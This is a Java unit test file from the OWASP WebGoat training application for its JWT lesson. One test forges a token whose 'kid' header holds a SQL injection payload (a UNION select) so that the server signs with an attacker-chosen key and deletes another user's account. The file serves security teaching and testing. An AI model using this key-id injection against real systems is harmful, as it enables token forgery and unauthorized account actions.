package org.owasp.webgoat.plugin;

import com.google.common.collect.Maps;
import io.jsonwebtoken.Jwts;
import org.hamcrest.CoreMatchers;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.owasp.webgoat.plugins.LessonTest;
import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;

import java.util.Date;
import java.util.Map;
import java.util.concurrent.TimeUnit;

import static org.hamcrest.Matchers.is;
import static org.mockito.Mockito.when;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

@RunWith(SpringJUnit4ClassRunner.class)
public class JWTFinalEndpointTest extends LessonTest {

    private static final String TOKEN_JERRY = "eyJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6IkhTNTEyIn0.eyJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImVtYWlsIjoiamVycnlAd2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IkplcnJ5In0.xBc5FFwaOcuxjdr_VJ16n8Jb7vScuaZulNTl66F2MWF1aBe47QsUosvbjWGORNcMPiPNwnMu1Yb0WZVNrp2ZXA";

    @Before
    public void setup() {
        JWT jwt = new JWT();
        when(webSession.getCurrentLesson()).thenReturn(jwt);
        this.mockMvc = MockMvcBuilders.webAppContextSetup(this.wac).build();
        when(webSession.getUserName()).thenReturn("unit-test");
    }

    @Test
    public void solveAssignment() throws Exception {
        String key = "deletingTom";
        Map<String, Object> claims = Maps.newHashMap();
        claims.put("username", "Tom");
        String token = Jwts.builder()
                .setHeaderParam("kid", "hacked' UNION select '" + key + "' from INFORMATION_SCHEMA.SYSTEM_USERS --")
                .setIssuedAt(new Date(System.currentTimeMillis() + TimeUnit.DAYS.toDays(10)))
                .setClaims(claims)
                .signWith(io.jsonwebtoken.SignatureAlgorithm.HS512, key)
                .compact();
        mockMvc.perform(MockMvcRequestBuilders.post("/JWT/final/delete")
                .param("token", token)
                .content(""))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.lessonCompleted", is(true)));
    }

    @Test
    public void withJerrysKeyShouldNotSolveAssignment() throws Exception {
        mockMvc.perform(MockMvcRequestBuilders.post("/JWT/final/delete")
                .param("token", TOKEN_JERRY)
                .content(""))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("jwt-final-jerry-account"))));
    }
}